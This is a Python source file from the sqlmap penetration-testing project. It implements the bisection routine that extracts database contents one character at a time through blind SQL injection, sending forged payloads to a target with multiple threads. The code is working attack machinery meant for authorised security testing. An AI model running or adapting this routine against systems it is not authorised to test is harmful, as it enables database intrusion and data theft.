#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import threading
import time

from lib.core.agent import agent
from lib.core.common import dataToSessionFile
from lib.core.common import dataToStdout
from lib.core.common import replaceNewlineTabs
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.exception import sqlmapValueException
from lib.core.progress import ProgressBar
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request


def bisection(payload, expression, length=None):
    """
    Bisection algorithm that can be used to perform blind SQL injection
    on an affected host
    """

    if kb.dbmsDetected:
        _, _, _, fieldToCast = agent.getFields(expression)
        nulledCastedField    = agent.nullAndCastField(fieldToCast)
        expressionReplaced   = expression.replace(fieldToCast, nulledCastedField, 1)
        expressionUnescaped  = unescaper.unescape(expressionReplaced)
    else:
        expressionUnescaped  = unescaper.unescape(expression)

    infoMsg = "query: %s" % expressionUnescaped
    logger.info(infoMsg)

    if length and not isinstance(length, int) and length.isdigit():
        length = int(length)

    if length == 0:
        return 0, ""

    showEta = conf.eta and length
    numThreads = min(conf.threads, length)
    threads = []

    if showEta:
        progress = ProgressBar(maxValue=length)
        progressTime = []

    if conf.verbose in ( 1, 2 ) and not showEta:
        if isinstance(length, int) and conf.threads > 1:
            infoMsg = "starting %d threads" % numThreads
            logger.info(infoMsg)

            dataToStdout("[%s] [INFO] retrieved: %s" % (time.strftime("%X"), "_" * length))
            dataToStdout("\r[%s] [INFO] retrieved: " % time.strftime("%X"))
        else:
            dataToStdout("[%s] [INFO] retrieved: " % time.strftime("%X"))

    queriesCount = [0]    # As list to deal with nested scoping rules


    def getChar(idx):
        maxValue = 127
        minValue = 0

        while (maxValue - minValue) != 1:
            queriesCount[0] += 1
            limit = ((maxValue + minValue) / 2)

            forgedPayload = payload % (expressionUnescaped, idx, limit)
            result = Request.queryPage(forgedPayload)

            if result == kb.defaultResult:
                minValue = limit
            else:
                maxValue = limit

            if (maxValue - minValue) == 1:
                if maxValue == 1:
                    return None
                else:
                    return chr(minValue + 1)


    def etaProgressUpdate(charTime, index):
        if len(progressTime) <= ( (length * 3) / 100 ):
            eta = 0
        else:
            midTime = sum(progressTime) / len(progressTime)
            midTimeWithLatest = (midTime + charTime) / 2
            eta = midTimeWithLatest * (length - index) / conf.threads

        progressTime.append(charTime)
        progress.update(index)
        progress.draw(eta)


    if conf.threads > 1 and isinstance(length, int) and length > 1:
        value   = [None] * length
        index   = [0]    # As list for python nested function scoping
        idxlock = threading.Lock()
        iolock  = threading.Lock()


        def downloadThread():
            while True:
                idxlock.acquire()

                if index[0] >= length:
                    idxlock.release()

                    return

                index[0] += 1
                curidx = index[0]
                idxlock.release()

                charStart = time.time()
                val = getChar(curidx)

                if val == None:
                    raise sqlmapValueException, "Failed to get character at index %d (expected %d total)" % (curidx, length)

                value[curidx-1] = val

                if showEta:
                    etaProgressUpdate(time.time() - charStart, index[0])
                elif conf.verbose in ( 1, 2 ):
                    s = "".join([c or "_" for c in value])
                    iolock.acquire()
                    dataToStdout("\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), s))
                    iolock.release()

        # Start the threads
        for _ in range(numThreads):
            thread = threading.Thread(target=downloadThread)
            thread.start()
            threads.append(thread)

        # And wait for them to all finish
        for thread in threads:
            thread.join()

        assert None not in value

        value = "".join(value)

        assert index[0] == length

        if conf.sessionFile:
            dataToSessionFile(replaceNewlineTabs(value))

        if conf.verbose in ( 1, 2 ) and not showEta:
            dataToStdout("\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), value))

    else:
        value = ""
        index = 0

        while True:
            index += 1
            charStart = time.time()
            val = getChar(index)

            if val == None:
                break

            value += val

            if conf.sessionFile:
                dataToSessionFile(replaceNewlineTabs(val))

            if showEta:
                etaProgressUpdate(time.time() - charStart, index)
            elif conf.verbose in ( 1, 2 ):
                dataToStdout(val)

    if conf.verbose in ( 1, 2 ) or showEta:
        dataToStdout("\n")

    if ( conf.verbose in ( 1, 2 ) and showEta and len(str(progress)) >= 64 ) or conf.verbose >= 3:
        infoMsg = "retrieved: %s" % value
        logger.info(infoMsg)

    if conf.sessionFile:
        dataToSessionFile("]\n")

    return queriesCount[0], value
